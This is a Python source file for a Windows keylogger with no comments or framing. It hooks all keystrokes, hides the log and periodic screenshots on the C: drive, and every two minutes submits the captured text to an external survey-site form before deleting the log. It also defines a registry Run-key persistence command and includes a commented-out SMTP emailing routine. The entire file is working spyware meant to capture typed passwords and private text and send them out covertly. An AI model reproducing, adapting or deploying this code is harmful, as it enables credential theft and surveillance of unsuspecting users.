import pyHook,sys,pythoncom,win32console,re
import logging,os,autopy
from datetime import datetime
import win32api, win32con
from mechanize import Browser
i = 0
j = 0
j2 = 0
startx = "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /d pic.exe"
path1 = 'C:\\{}'
pathurl = "https://eSurv.org?s=LCJMFG_147bd357"
path2 = 'C:\\systemlog.txt'
""" def sendmail(save):
	server = smtplib.SMTP('smtp.live.com', 25)
	verify1 = server.ehlo()
	debig = server.starttls()
	print verify1
	print debig
	server.login("yourmail@outlook.in", "passwd")
	msg = "\n"+save
	server.sendmail("yourmail@outlook.in", "mail@outlook.in", msg) """
def fillform(ss):
	b = Browser()
	b.open(pathurl)
	b.select_form(nr=0)
	b['q0'] = ss;
	b.submit()
def screenshot():
	global i
	global j
	n = datetime.now()
	if n.minute % 2 == 0 and j != n.minute :
		i += 1
		j = n.minute
		s = "name"+str(i)+".png";
		bitmap = autopy.bitmap.capture_screen()
		bitmap.save(path1.format(s))
		fs = path1.format(s)
		win32api.SetFileAttributes(fs,win32con.FILE_ATTRIBUTE_HIDDEN)
def OnKeyboardEvent(event):
	if event.Ascii !=0 or 8:
		screenshot()		
		file_log = path2 
		if os.path.isfile(file_log) != True:
			f = open(file_log,'w')
			f.write(chr(event.Ascii))
			f.close()
			win32api.SetFileAttributes(file_log,win32con.FILE_ATTRIBUTE_HIDDEN)
		else:
			f = open(file_log,'r+')
			save = f.read()
			f.close()
			n = datetime.now()
			global j2
			if n.minute % 2 == 0 and j2!= n.minute:
				j2 = n.minute
				try:
					fillform(save)
					os.remove(file_log)
				except:
					pass
			k=chr(event.Ascii)
			if event.Ascii==13:
				k='\n'    
			if event.Ascii==32:
				k='  '
			save += k
			try:
				f = open(file_log,'r+')
				f.write(save)
				f.close()
			except:
				f = open(file_log,'w')
				f.close()
				win32api.SetFileAttributes(file_log,win32con.FILE_ATTRIBUTE_HIDDEN)
	return True
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()